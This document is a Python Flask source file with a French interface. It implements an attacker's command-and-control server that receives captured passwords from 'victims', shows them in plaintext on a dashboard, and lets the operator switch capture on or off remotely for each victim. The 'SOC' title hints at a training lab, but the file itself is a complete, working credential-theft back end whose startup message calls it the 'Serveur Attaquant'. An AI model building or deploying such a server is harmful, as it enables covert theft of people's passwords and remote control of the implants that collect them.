from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from pathlib import Path
from datetime import date
import json

app = Flask(__name__)

LOGS_DIR = Path("logs")
LOGS_DIR.mkdir(exist_ok=True)

COMMANDS_DIR = Path("commands")
COMMANDS_DIR.mkdir(exist_ok=True)

HOST = "0.0.0.0"
PORT = 5000

# ---------- TEMPLATES HTML ----------

INDEX_TEMPLATE = """
<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <title>Contrôleur SOC – Victimes</title>
    <style>
      body { font-family: sans-serif; max-width: 800px; margin: 40px auto; }
      h1 { font-size: 1.6rem; }
      ul { list-style: none; padding: 0; }
      li { margin: 8px 0; }
      a { text-decoration: none; color: #0050aa; }
      a:hover { text-decoration: underline; }
      .note { margin-top: 20px; font-size: 0.85rem; color: #555; }
    </style>
  </head>
  <body>
    <h1>Contrôleur – Victimes actives</h1>

    {% if victims %}
      <ul>
      {% for v in victims %}
        <li><a href="{{ url_for('view_victim', victim_id=v) }}">{{ v }}</a></li>
      {% endfor %}
      </ul>
    {% else %}
      <p>Aucune victime n'a encore envoyé de logs.</p>
    {% endif %}

    <div class="note">
      Interface de supervision : cliquez sur une victime pour voir ses événements
      et contrôler la capture.
    </div>
  </body>
</html>
"""

VICTIM_TEMPLATE = """
<!doctype html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <title>Logs victime {{ victim_id }}</title>
    <meta http-equiv="refresh" content="5">
    <style>
      body { font-family: sans-serif; max-width: 1000px; margin: 40px auto; }
      h1 { font-size: 1.6rem; }
      table { border-collapse: collapse; width: 100%; margin-top: 20px; }
      th, td { border: 1px solid #ccc; padding: 6px 8px; font-size: 0.9rem; }
      th { background: #f0f0f0; text-align: left; }
      tr:nth-child(even) { background: #fafafa; }
      .back { margin-top: 10px; display: inline-block; }
      .note { margin-top: 15px; font-size: 0.85rem; color: #555; }
      .score-0 { color: #a00; }
      .score-1 { color: #c40; }
      .score-2 { color: #aa8800; }
      .score-3 { color: #0a8; }
      .score-4 { color: #080; font-weight: bold; }
      .controls { margin-top: 15px; }
      button { margin-right: 8px; padding: 6px 10px; }
    </style>
  </head>
  <body>
    <h1>Victime : {{ victim_id }}</h1>

    <a class="back" href="{{ url_for('index') }}">← Retour à la liste des victimes</a>

    <div class="controls">
      {% if commands.capture_enabled %}
        État de la capture :
        <span style="color: green; font-weight: bold;">ACTIVE</span>
      {% else %}
        État de la capture :
        <span style="color: red; font-weight: bold;">STOPPÉE</span>
      {% endif %}
      <br><br>

      <form method="post" action="{{ url_for('api_commands', victim_id=victim_id) }}" style="display:inline;">
        <input type="hidden" name="capture_enabled" value="true">
        <button type="submit">Activer la capture</button>
      </form>

      <form method="post" action="{{ url_for('api_commands', victim_id=victim_id) }}" style="display:inline;">
        <input type="hidden" name="capture_enabled" value="false">
        <button type="submit">Stopper la capture</button>
      </form>
    </div>

    {% if events %}
      <table>
        <thead>
          <tr>
            <th>Timestamp</th>
            <th>Mot de passe</th>
            <th>Score</th>
            <th>Label</th>
          </tr>
        </thead>
        <tbody>
          {% for e in events %}
            <tr>
              <td>{{ e.timestamp }}</td>
              <td>{{ e.password }}</td>
              <td class="score-{{ e.strength_score }}">{{ e.strength_score }}</td>
              <td>{{ e.strength_label }}</td>
            </tr>
          {% endfor %}
        </tbody>
      </table>
    {% else %}
      <p>Aucun événement enregistré pour cette victime.</p>
    {% endif %}

    <div class="note">
      Cette page se rafraîchit automatiquement toutes les 5 secondes.
      Les événements sont chargés depuis <code>logs/{{ victim_id }}</code>.
    </div>
  </body>
</html>
"""

# ---------- MÉTIER ----------


def store_event(event: dict):
    """Stocke l'événement JSON dans un fichier en fonction de la victime et de la date."""
    victim_id = event.get("victim_id", "unknown")
    victim_dir = LOGS_DIR / victim_id
    victim_dir.mkdir(exist_ok=True)

    filename = victim_dir / f"{date.today().isoformat()}.log"

    with filename.open("a", encoding="utf-8") as f:
        f.write(json.dumps(event, ensure_ascii=False) + "\n")

    print(f"[i] Événement stocké dans {filename}")


def get_commands(victim_id: str) -> dict:
    """Lit le fichier de commandes pour une victime, ou valeurs par défaut."""
    path = COMMANDS_DIR / f"{victim_id}.json"
    if not path.exists():
        return {"capture_enabled": True}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {"capture_enabled": True}


def set_commands(victim_id: str, commands: dict):
    """Écrit le fichier de commandes pour une victime."""
    path = COMMANDS_DIR / f"{victim_id}.json"
    path.write_text(json.dumps(commands, ensure_ascii=False), encoding="utf-8")


# ---------- API utilisée par la VICTIME ----------


@app.route("/logs", methods=["POST"])
def receive_logs():
    data = request.get_json(silent=True) or {}
    print("[i] Reçu un événement :")
    print(data)
    store_event(data)
    return jsonify({"status": "ok"}), 200


# ---------- API de commandes (appelée par UI + victime) ----------


@app.route("/api/commands/<victim_id>", methods=["GET", "POST"])
def api_commands(victim_id):
    if request.method == "GET":
        cmds = get_commands(victim_id)
        print(f"[i] GET commandes pour {victim_id} : {cmds}")
        return jsonify(cmds)

    # POST : vient du formulaire HTML OU d'un client JSON
    if request.is_json:
        data = request.get_json(silent=True) or {}
        raw = data.get("capture_enabled", "true")
    else:
        raw = request.form.get("capture_enabled", "true")

    enabled = str(raw).lower() in ("true", "1", "yes", "on")

    cmds = get_commands(victim_id)
    cmds["capture_enabled"] = enabled
    set_commands(victim_id, cmds)
    print(f"[i] Commandes mises à jour pour {victim_id} : {cmds}")

    # Si ça vient du navigateur (formulaire), on renvoie vers la page de la victime
    if not request.is_json:
        return redirect(url_for("view_victim", victim_id=victim_id))

    # Sinon, pour un client API, on retourne du JSON
    return jsonify(cmds)


# ---------- CONTRÔLEUR WEB ----------


@app.route("/", methods=["GET"])
def index():
    victims = [p.name for p in LOGS_DIR.iterdir() if p.is_dir()]
    victims.sort()
    return render_template_string(INDEX_TEMPLATE, victims=victims)


@app.route("/victim/<victim_id>", methods=["GET"])
def view_victim(victim_id):
    victim_dir = LOGS_DIR / victim_id
    events = []

    if victim_dir.exists() and victim_dir.is_dir():
        for log_file in sorted(victim_dir.glob("*.log")):
            with log_file.open(encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                        events.append(ev)
                    except json.JSONDecodeError:
                        continue

    events.sort(key=lambda e: e.get("timestamp", 0))

    class EventView:
        def __init__(self, d):
            self.timestamp = d.get("timestamp", "")
            self.password = d.get("password", "")
            self.strength_score = d.get("strength_score", 0)
            self.strength_label = d.get("strength_label", "")

    events_for_template = [EventView(e) for e in events]
    commands = get_commands(victim_id)

    return render_template_string(
        VICTIM_TEMPLATE,
        victim_id=victim_id,
        events=events_for_template,
        commands=commands,
    )


# ---------- LANCEMENT ----------

if __name__ == "__main__":
    print(f"[i] Serveur Attaquant démarré sur http://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT, debug=True)
